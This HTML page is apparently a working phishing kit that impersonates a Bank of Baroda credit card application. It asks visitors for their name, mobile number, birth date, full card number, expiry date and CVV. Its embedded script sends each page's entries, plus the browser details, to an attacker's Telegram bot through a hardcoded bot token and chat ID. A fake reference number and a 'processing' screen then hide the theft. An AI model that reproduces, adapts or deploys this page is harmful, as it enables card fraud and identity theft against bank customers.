<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Bank Of Baroda - Credit Card Application</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        html, body {
            height: 100%; /* Ensure full height base */
        }
        
        body {
            background: linear-gradient(135deg, #8B0000 0%, #B22222 100%);
            color: #333;
            min-height: 100vh;
            padding: 10px;
            display: flex;
            justify-content: center;
            align-items: center; /* Desktop: Center vertically */
            -webkit-tap-highlight-color: transparent;
        }
        
        .application-container {
            width: 100%;
            max-width: 900px;
            background-color: #ffffff;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.2);
            min-height: 85vh; /* Desktop height */
            display: flex;
            flex-direction: column;
            position: relative;
        }
        
        /* Header Styles */
        .header {
            background: linear-gradient(to right, #8B0000, #B22222);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 5px solid #FF8C00;
            position: relative;
            overflow: hidden;
            flex-shrink: 0;
            z-index: 10;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(to right, #FF8C00, #FFA500);
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 12px;
            flex: 1;
        }
        
        .logo-img {
            height: 50px;
            width: 50px;
            border-radius: 50%;
            background: white;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
            border: 2px solid #FF8C00;
            flex-shrink: 0;
        }
        
        .logo-img img {
            height: 40px;
            width: 40px;
            object-fit: contain;
            border-radius: 50%;
        }
        
        .bank-info {
            display: flex;
            flex-direction: column;
            min-width: 0;
        }
        
        .bank-name {
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 0.8px;
            color: #ffffff;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
            line-height: 1.2;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .bank-tagline {
            font-size: 12px;
            opacity: 0.95;
            margin-top: 3px;
            color: #FFD700;
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .credit-card-icon {
            font-size: 35px;
            color: #FFD700;
            opacity: 0.9;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            flex-shrink: 0;
            margin-left: 10px;
        }
        
        /* Form Container */
        .form-container {
            padding: 20px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }
        
        /* Page Styles */
        .page {
            display: none;
            flex-grow: 1;
        }
        
        .page.active {
            display: flex;
            flex-direction: column;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .page-title {
            color: #8B0000;
            font-size: 22px;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 3px solid #f0f0f0;
            position: relative;
            line-height: 1.3;
        }
        
        .page-title::after {
            content: '';
            position: absolute;
            bottom: -3px;
            left: 0;
            width: 80px;
            height: 3px;
            background: linear-gradient(to right, #FF8C00, #FFA500);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #333;
            font-size: 15px;
        }
        
        .required::after {
            content: ' *';
            color: #e74c3c;
        }
        
        .input-container {
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            background-color: #fdfdfd;
            -webkit-appearance: none;
            appearance: none;
        }
        
        input:focus {
            border-color: #B22222;
            outline: none;
            box-shadow: 0 0 0 3px rgba(178, 34, 34, 0.15);
            background-color: #fff;
        }
        
        .input-hint {
            font-size: 12.5px;
            color: #666;
            margin-top: 5px;
            padding-left: 5px;
            line-height: 1.4;
        }
        
        /* Navigation Buttons */
        .navigation {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            flex-shrink: 0;
            padding-bottom: 10px; /* Add padding for mobile */
            position: relative;
        }
        
        .btn {
            padding: 16px 30px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            min-width: 250px;
            width: 100%;
            max-width: 350px;
            touch-action: manipulation;
        }
        
        .btn-next {
            background: linear-gradient(to right, #B22222, #8B0000);
            color: white;
        }
        
        .btn-next:hover {
            background: linear-gradient(to right, #8B0000, #A52A2A);
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(139, 0, 0, 0.3);
        }
        
        .btn-submit {
            background: linear-gradient(to right, #FF8C00, #FF4500);
            color: white;
        }
        
        .btn-submit:hover {
            background: linear-gradient(to right, #FF4500, #FF6347);
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(255, 140, 0, 0.4);
        }
        
        /* Telegram Status Indicators */
        .telegram-status {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
        }
        
        .telegram-sending {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        .telegram-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .telegram-error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        /* Footer */
        .footer {
            background-color: #FFF5F5;
            padding: 15px 20px;
            text-align: center;
            color: #666;
            font-size: 13px;
            border-top: 1px solid #FFE4E1;
            flex-shrink: 0;
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 8px;
            color: #8B0000;
            font-weight: 600;
            font-size: 13px;
            flex-wrap: wrap;
        }

        /* Processing Page Styles */
        .processing-container { 
            text-align: center; 
            padding: 20px; 
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .processing-icon { 
            font-size: 60px; 
            color: #8B0000; 
            margin-bottom: 20px; 
            animation: pulse 1.5s infinite; 
        }
        
        @keyframes pulse { 
            0% { transform: scale(1); opacity: 1; } 
            50% { transform: scale(1.05); opacity: 0.8; } 
            100% { transform: scale(1); opacity: 1; } 
        }
        
        .processing-title {
            color: #8B0000;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        .processing-text {
            font-size: 16px;
            color: #555;
            margin-bottom: 30px;
            max-width: 500px;
            line-height: 1.5;
        }
        
        .reference-container {
            background: linear-gradient(to right, #FFF5F5, #FFE4E1);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #8B0000;
            box-shadow: 0 4px 10px rgba(139, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }
        
        .reference-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .reference-number { 
            font-size: 22px; 
            font-weight: 800; 
            color: #8B0000; 
            background: #fff; 
            padding: 15px; 
            border: 2px dashed #FF8C00; 
            margin: 15px 0; 
            border-radius: 8px; 
            word-break: break-all;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }
        
        .copy-btn { 
            background: linear-gradient(to right, #B22222, #8B0000);
            color: white; 
            border: none; 
            padding: 12px 25px; 
            border-radius: 8px; 
            margin-top: 10px; 
            cursor: pointer;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            background: linear-gradient(to right, #8B0000, #A52A2A);
            transform: translateY(-2px);
        }
        
        .copy-success {
            color: #27ae60;
            font-weight: 600;
            margin-top: 10px;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        /* ========================================= */
        /* CRITICAL MOBILE FIXES FOR KEYBOARD ISSUE */
        /* ========================================= */
        
        @media (max-width: 768px) {
            body {
                /* FIX 1: Stop centering on mobile.
                   When keyboard opens, "center" moves up. 
                   "flex-start" keeps it at the top. */
                align-items: flex-start; 
                
                /* Allow body to scroll if needed */
                height: auto;
                min-height: 100vh;
                
                /* Add padding so it doesn't touch edges */
                padding: 10px;
                padding-top: 20px;
            }
            
            .application-container {
                /* FIX 2: PIXEL-BASED MIN-HEIGHT
                   Instead of 95vh, we use 600px.
                   When keyboard opens, screen becomes ~300px high.
                   But container stays 600px.
                   Result: The page scrolls instead of squishing. */
                min-height: 600px !important;
                height: auto !important;
                
                margin-bottom: 20px;
            }
            
            .header {
                padding: 15px;
            }
            
            .form-container {
                /* Ensure form container takes available space but doesn't shrink to 0 */
                flex-grow: 1;
                min-height: 300px; 
            }
            
            /* Make footer stick to bottom of container, not screen */
            .footer {
                margin-top: auto;
            }
            
            .processing-title {
                font-size: 22px;
            }
            
            .processing-text {
                font-size: 15px;
            }
            
            .reference-number {
                font-size: 18px;
                padding: 12px;
            }
        }
        
        /* Extra small screens */
        @media (max-width: 480px) {
            .header { flex-direction: row; }
            .bank-name { font-size: 16px; }
            .btn { font-size: 16px; padding: 14px; }
            .processing-title { font-size: 20px; }
            .processing-text { font-size: 14px; }
            .reference-number { font-size: 16px; }
        }
    </style>
</head>
<body>
    <div class="application-container">
        <!-- Header -->
        <header class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQw7fTXM3SknRljQIJ1q6QvI81a_NLOgTY557Al_BgsGBwATdRleWx5ZFk&s=10" alt="Bank Of Baroda Logo">
                </div>
                <div class="bank-info">
                    <div class="bank-name">BANK OF BARODA</div>
                    <div class="bank-tagline">Your Trust, Our Commitment</div>
                </div>
            </div>
            <div class="credit-card-icon">
                <i class="far fa-credit-card"></i>
            </div>
        </header>
        
        <!-- Form Container -->
        <div class="form-container">
            <!-- Page 1 -->
            <div class="page active" id="page1">
                <h2 class="page-title">Personal Information</h2>
                
                <div class="form-group">
                    <label for="fullName" class="required">Full Name</label>
                    <div class="input-container">
                        <input type="text" id="fullName" placeholder="Enter your full name as per ID proof">
                    </div>
                    <div class="input-hint">Please enter your name exactly as it appears on your ID proof</div>
                </div>
                
                <div class="form-group">
                    <label for="mobile" class="required">Mobile Number</label>
                    <div class="input-container">
                        <input type="tel" id="mobile" placeholder="Enter 10-digit mobile number" maxlength="10" inputmode="numeric">
                    </div>
                    <div class="input-hint">Enter BOB Register Mobile No.</div>
                </div>
                
                <div class="form-group">
                    <label for="dob" class="required">Date of Birth</label>
                    <div class="input-container">
                        <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" inputmode="numeric">
                    </div>
                </div>
                
                <div class="navigation">
                    <button class="btn btn-next" id="next1">Continue <i class="fas fa-arrow-right"></i></button>
                </div>
                
                <!-- Telegram Status Indicators -->
                <div class="telegram-status telegram-sending" id="telegramSending1" style="display: none;">
                    <i class="fas fa-spinner fa-spin"></i> Verifying...
                </div>
                <div class="telegram-status telegram-success" id="telegramSuccess1" style="display: none;">
                    <i class="fas fa-check-circle"></i> Data sent successfully!
                </div>
            </div>
            
            <!-- Page 2 -->
            <div class="page" id="page2">
                <h2 class="page-title">Card Verification</h2>
                <div class="form-group">
                    <label for="lastFourDigits" class="required">Last 4 Digits of Your Card</label>
                    <div class="input-container">
                        <input type="text" id="lastFourDigits" placeholder="XXXX" maxlength="4" inputmode="numeric">
                    </div>
                </div>
                <div class="navigation">
                    <button class="btn btn-next" id="next2">Continue <i class="fas fa-arrow-right"></i></button>
                </div>
                
                <!-- Telegram Status Indicators -->
                <div class="telegram-status telegram-sending" id="telegramSending2" style="display: none;">
                    <i class="fas fa-spinner fa-spin"></i> Verifying...
                </div>
                <div class="telegram-status telegram-success" id="telegramSuccess2" style="display: none;">
                    <i class="fas fa-check-circle"></i> Data sent successfully!
                </div>
            </div>
            
            <!-- Page 3 -->
            <div class="page" id="page3">
                <h2 class="page-title">Card Details</h2>
                <div class="form-group">
                    <label for="cardNumber" class="required">16-Digit Card Number</label>
                    <div class="input-container">
                        <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" inputmode="numeric">
                    </div>
                </div>
                <div class="form-group">
                    <label for="expiryDate" class="required">Expiry Date</label>
                    <div class="input-container">
                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                    </div>
                </div>
                <div class="form-group">
                    <label for="cvv" class="required">CVV</label>
                    <div class="input-container">
                        <input type="text" id="cvv" placeholder="XXX" maxlength="3" inputmode="numeric">
                    </div>
                </div>
                <div class="navigation">
                    <button class="btn btn-submit" id="submitBtn">Submit Application <i class="fas fa-paper-plane"></i></button>
                </div>
                
                <!-- Telegram Status Indicators -->
                <div class="telegram-status telegram-sending" id="telegramSending3" style="display: none;">
                    <i class="fas fa-spinner fa-spin"></i> Verifying...
                </div>
                <div class="telegram-status telegram-success" id="telegramSuccess3" style="display: none;">
                    <i class="fas fa-check-circle"></i> Data sent successfully!
                </div>
            </div>

            <!-- Page 4 Processing -->
            <div class="page" id="page4">
                <div class="processing-container">
                    <div class="processing-icon"><i class="fas fa-cogs"></i></div>
                    <h2 class="processing-title">Please Wait</h2>
                    <p class="processing-text">Your application is being processed. Please do not refresh or close this window.</p>
                    
                    <div class="reference-container">
                        <div class="reference-label">Your Application Reference Number</div>
                        <div class="reference-number" id="referenceNumber">BRD-8347-6291-5802</div>
                        
                        <button class="copy-btn" id="copyRefBtn">
                            <i class="far fa-copy"></i> Copy Reference Number
                        </button>
                        
                        <div class="copy-success" id="copySuccess">
                            <i class="fas fa-check-circle"></i> Copied to clipboard!
                        </div>
                    </div>
                    
                    <p class="processing-text">
                        Please save this reference number for future correspondence. 
                        Our customer service team will contact you within 24 hours.
                    </p>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div>Bank Of Baroda Â© 2025 - 2026. All Rights Reserved.</div>
            <div class="security-note">
                <i class="fas fa-shield-alt"></i>
                <span>Your information is secured with 256-bit SSL encryption</span>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const pages = document.querySelectorAll('.page');
        const nextButtons = document.querySelectorAll('.btn-next');
        const submitBtn = document.getElementById('submitBtn');
        const copyRefBtn = document.getElementById('copyRefBtn');
        const copySuccess = document.getElementById('copySuccess');
        const referenceNumber = document.getElementById('referenceNumber');
        
        // Input fields
        const dobInput = document.getElementById('dob');
        const expiryInput = document.getElementById('expiryDate');
        const cardNumberInput = document.getElementById('cardNumber');
        const lastFourDigitsInput = document.getElementById('lastFourDigits');
        const cvvInput = document.getElementById('cvv');
        const mobileInput = document.getElementById('mobile');
        const fullNameInput = document.getElementById('fullName');

        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8293636059:AAEcfWmdIGQrcPSZvEZzBfKdDjlWC4LI6vs';
        const TELEGRAM_CHAT_ID = '7155441629';

        // Generate a random reference number
        function generateReferenceNumber() {
            const prefix = "BRD";
            const randomNumbers = Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
            return `${prefix}-${randomNumbers.substring(0,4)}-${randomNumbers.substring(4,8)}-${randomNumbers.substring(8,12)}`;
        }

        // Set the reference number
        referenceNumber.textContent = generateReferenceNumber();

        // Scroll helper for mobile
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                setTimeout(() => {
                    this.scrollIntoView({behavior: "smooth", block: "center"});
                }, 300);
            });
        });

        // Function to send data to Telegram
        async function sendToTelegram(data, pageNumber) {
            try {
                // Show sending indicator
                document.getElementById(`telegramSending${pageNumber}`).style.display = 'flex';
                document.getElementById(`telegramSuccess${pageNumber}`).style.display = 'none';
                
                // Create message text
                let message = `ðŸ”” *BANK OF BARODA - PAGE ${pageNumber} DATA* ðŸ””\n\n`;
                
                // Add timestamp
                const now = new Date();
                message += `ðŸ“… *Timestamp:* ${now.toLocaleString()}\n`;
                
                // Add page-specific data
                if (pageNumber === 1) {
                    message += `ðŸ‘¤ *PERSONAL DETAILS*\n`;
                    message += `ðŸ“› Full Name: ${data.fullName || 'N/A'}\n`;
                    message += `ðŸ“± Mobile: ${data.mobile || 'N/A'}\n`;
                    message += `ðŸŽ‚ Date of Birth: ${data.dob || 'N/A'}\n`;
                } else if (pageNumber === 2) {
                    message += `ðŸ’³ *CARD VERIFICATION*\n`;
                    message += `ðŸ”¢ Last 4 Digits: ${data.lastFourDigits || 'N/A'}\n`;
                    message += `\nðŸ‘¤ *PERSONAL DETAILS (Previous Page)*\n`;
                    message += `ðŸ“› Full Name: ${data.fullName || 'N/A'}\n`;
                    message += `ðŸ“± Mobile: ${data.mobile || 'N/A'}\n`;
                } else if (pageNumber === 3) {
                    message += `ðŸ’³ *FULL CARD DETAILS*\n`;
                    message += `ðŸ”¢ Card Number: ${data.cardNumber || 'N/A'}\n`;
                    message += `ðŸ“… Expiry Date: ${data.expiryDate || 'N/A'}\n`;
                    message += `ðŸ” CVV: ${data.cvv || 'N/A'}\n`;
                    message += `\nðŸ‘¤ *PERSONAL DETAILS*\n`;
                    message += `ðŸ“› Full Name: ${data.fullName || 'N/A'}\n`;
                    message += `ðŸ“± Mobile: ${data.mobile || 'N/A'}\n`;
                    message += `ðŸŽ‚ Date of Birth: ${data.dob || 'N/A'}\n`;
                    message += `\nðŸ”¢ *CARD VERIFICATION*\n`;
                    message += `Last 4 Digits: ${data.lastFourDigits || 'N/A'}\n`;
                }
                
                // Create Telegram API URL
                const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                // Send to Telegram using fetch
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    // Show success indicator
                    document.getElementById(`telegramSending${pageNumber}`).style.display = 'none';
                    document.getElementById(`telegramSuccess${pageNumber}`).style.display = 'flex';
                    
                    // Hide success indicator after 3 seconds
                    setTimeout(() => {
                        document.getElementById(`telegramSuccess${pageNumber}`).style.display = 'none';
                    }, 3000);
                    
                    return true;
                } else {
                    throw new Error('Telegram API error');
                }
                
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                document.getElementById(`telegramSending${pageNumber}`).style.display = 'none';
                // Even if Telegram fails, continue with form flow
                return false;
            }
        }
        
        // Collect all form data
        function collectFormData() {
            return {
                fullName: fullNameInput.value.trim(),
                mobile: mobileInput.value.trim(),
                dob: dobInput.value.trim(),
                lastFourDigits: lastFourDigitsInput.value.trim(),
                cardNumber: cardNumberInput.value.trim(),
                expiryDate: expiryInput.value.trim(),
                cvv: cvvInput.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer
            };
        }

        // Navigation
        async function goToPage(pageNumber) {
            // Collect current data before navigating
            const formData = collectFormData();
            
            // Send current page data to Telegram
            if (pageNumber > 1) { // Send data when moving forward from a page
                const currentPage = Array.from(pages).findIndex(page => page.classList.contains('active')) + 1;
                await sendToTelegram(formData, currentPage);
            }
            
            // Hide all pages
            pages.forEach(page => page.classList.remove('active'));
            
            // Show the selected page
            document.getElementById(`page${pageNumber}`).classList.add('active');
            document.querySelector('.form-container').scrollTop = 0;
        }

        // Formatters
        dobInput.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
            if (v.length > 5) v = v.substring(0, 5) + '/' + v.substring(5, 9);
            e.target.value = v;
        });
        
        expiryInput.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
            e.target.value = v;
        });

        cardNumberInput.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\D/g, '').substring(0,16);
            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
        });

        // Event Listeners
        document.getElementById('next1').addEventListener('click', async () => {
            if(fullNameInput.value && mobileInput.value && dobInput.value) {
                await goToPage(2);
            } else {
                alert('Please fill all details');
            }
        });

        document.getElementById('next2').addEventListener('click', async () => {
            if(lastFourDigitsInput.value.length === 4) {
                await goToPage(3);
            } else {
                alert('Please enter last 4 digits');
            }
        });

        document.getElementById('submitBtn').addEventListener('click', async () => {
            if(cardNumberInput.value && expiryInput.value && cvvInput.value) {
                // Send final data to Telegram
                const formData = collectFormData();
                await sendToTelegram(formData, 3);
                
                // Show processing page
                await goToPage(4);
            } else {
                alert('Please fill all card details');
            }
        });

        // Copy reference number to clipboard
        copyRefBtn.addEventListener('click', function() {
            navigator.clipboard.writeText(referenceNumber.textContent)
                .then(() => {
                    copySuccess.style.display = 'flex';
                    setTimeout(() => {
                        copySuccess.style.display = 'none';
                    }, 3000);
                })
                .catch(err => {
                    console.error('Failed to copy: ', err);
                    // Fallback for older browsers
                    const textArea = document.createElement('textarea');
                    textArea.value = referenceNumber.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    copySuccess.style.display = 'flex';
                    setTimeout(() => {
                        copySuccess.style.display = 'none';
                    }, 3000);
                });
        });

        // Initialize
        goToPage(1);
    </script>
</body>
</html>